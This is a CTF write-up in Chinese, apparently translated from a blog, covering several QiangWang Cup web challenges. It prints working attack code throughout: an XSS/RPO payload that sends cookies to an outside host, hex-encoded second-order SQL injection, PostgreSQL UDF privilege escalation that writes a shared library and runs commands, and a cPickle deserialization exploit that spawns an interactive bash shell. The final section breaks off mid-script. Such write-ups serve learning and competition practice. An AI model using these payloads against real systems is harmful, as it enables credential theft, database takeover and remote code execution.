# 第二届强网杯Web Writeup
##### 译文声明
本文是翻译文章，文章原作者 l3m0n@Syclover，文章来源：www.cnblogs.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
作者: [l3m0n@Syclover](mailto:l3m0n@Syclover)
**强网杯活动地址：**
## WEB 签到
[http://39.107.33.96:10000](http://39.107.33.96:10000/)  
右键源码可获得提示  
第一层用数组
    param1[]=1&param2[]=a
第二层依旧是用数组
    param1[]=1&param2[]=a
第三层参考文章  
    curl -v http://39.107.33.96:10000/ -H "Cookie: PHPSESSID=8iflkrd5vocvllro75oekanat3" --data "param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"
## Share your mind
题目描述
    http://39.107.33.96:20000
    Please help me find the vulnerability before I finish this site！
    hint：xss bot使用phantomjs，版本2.1.1
    hint2 : xss的点不在report页面
可以看到这里jquery.min.js前面没有`/`来限制，存在[rpo漏洞](http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html)
被一些同学私聊了一下，可能对rpo没理解到。可以看下图，主要是因为路由的存在，导致加载的js是可自己定义的。
以前遇到的rpo都是css方面，因为css语法没有那么严格，所以可以存在很多脏字符，但是js语法比较严，页面内容必须无脏字符才行。
    http://39.107.33.96:20000/index.php/view/article/784/%2f..%2f..%2f..%2f..%2f
这里面对一些特殊符号也进行了实体化编码，所以加载payload就使用了`eval(String.fromCharCode(97))`的形式
获取当前根目录的cookie:
    b=document.cookie;a="";document.write(a);
打回来的数据提示`Try to get the cookie of path
"/QWB_fl4g/QWB/"`，也就是要获取不同目录下的cookie。可以通过iframe来加载，最后来获取iframe里面的cookie。
    var i = document.createElement("iframe");
    i.setAttribute("src", "/QWB_fl4g/QWB/");
    document.body.appendChild(i);
    i.addEventListener( "load", function(){
      var content = i.contentWindow.document.cookie;
      location='//ip/'+btoa(content);
    }, false);
最后可拿到flag: `flag=QWB%7Bflag_is_f43kth4rpo%7D; HINT=Try to get the cookie of
path "/QWB_fl4g/QWB/"`
## Three hit
这个题目是一个二次注入，注入点首先是注册用户处，age只能输入数字型，我们可以通过hex编码一下
获取flag
    POST /index.php?func=register HTTP/1.1
    Host: 39.107.32.29:10000
    username=l3m0n23&age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&password=123456
## 彩蛋
题目描述
    http://106.75.97.46:8080/phrackCTF/
    建设报名网站初期，测试人员发现了构建文件中部分jar版本未更新导致的有意思的RCE，git地址：https://github.com/zjlywjh001/PhrackCTF-Platform-Team
rce稍后研究一下，是[shiro反序列漏洞](http://blog.knownsec.com/2016/08/apache-shiro-java/)
这里也存在一个非预期，就是postersql端口开放了，并且密码有泄露。
[docker搭建版](https://github.com/zjlywjh001/phrackCTF-Team-Docker/blob/master/dockerfile)
UDF提权
    SELECT lo_create(9023);
    insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e0020000000000000000200000000000020000000600', 'hex'));
    insert into pg_largeobject values (9023, 1, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 2, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 3, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 4, decode('xxx', 'hex'));
    insert into pg_largeobject values (9023, 5, decode('xxx', 'hex'));
    SELECT lo_export(9023, '/tmp/testeval.so');
    执行命令：
    CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
    select sys_eval('id');
删除函数
    drop function sys_eval
## Python is the best language
质量很高的题目，也已经有师傅把writeup写的很完好了… [python
writeup](https://xianzhi.aliyun.com/forum/topic/2219)
对于python2再做一些记录
本地搭建flask的时候还遇上点坑，创建数据库的时候加入下面代码
    SQLALCHEMY_DATABASE_URI = "mysql://root:123456@localhost/flask?charset=utf8"
    engine=create_engine(SQLALCHEMY_DATABASE_URI,echo=True)
    Base=declarative_base()
    ...
    Base.metadata.create_all(engine)
总共分为三步：  
1、绕过沙盒  
2、找到触发点，生成session文件名的规则  
3、导出反序列的字符串到文件
第一步出题人误以为了不导入的模块就不需要做封堵了，所以`subprocess.Popen`、`subprocess.call`可以被调用
第二步，生成session文件名是`md5('bdwsessions'+cookie名)`
第三步，登录的时候就可以进行文件导出，导出的时候一定要用dumpfile…被outfile坑了。
    abc' union select unhex('aaa'),null,null,null,null,null into dumpfile '/tmp/ffff/59dbc12f95f9e1064020d248ad791c0d'-- -
最后的Exp:
    import os
    import cPickle
    import subprocess
    import socket
    import binascii
    import hashlib
    def md5(s, raw_output=False):
        res = hashlib.md5(s.encode())
        if raw_output:
            return res.digest()
        return res.hexdigest()
    def _get_filename(key):
        key = key.encode('utf-8')  # XXX unicode review
        hash = md5(key)
        print hash
    print _get_filename('bdwsessionslemon')
    # Exploit that we want the target to unpickle
    class Exploit(object):
        def __reduce__(self):
            return (subprocess.call, (['bash','-c','{echo,xxxx}|{base64,-d}|{bash,-i}'],)) 
    def serialize_exploit():
        shellcode = cPickle.dumps(Exploit())
        return shellcode
    print binascii.b2a_hex(serialize_exploit())
当然其实对于触发，还有另外一种，不需要找到session名的生成方式。
其中entries是整个session的个数，threshold是一个固定的数字，存在config.py里面的`SESSION_FILE_THRESHOLD
= 1000`，也就是当session文件超过1w的时候就会列取所有的session进行一个个的反序列化，也是可以触发的。
## Wechat
出题人给出了公众后后面的地址，查看微信公众号的SDK可以发现可以通过一些xml数据进行发送
    import requests
    url = "http://39.107.33.77/"
    content = "Test http://www.baidu.com TEAMKEY icq3be93d38562e68bc0a86368c2d6b2"
    data = '''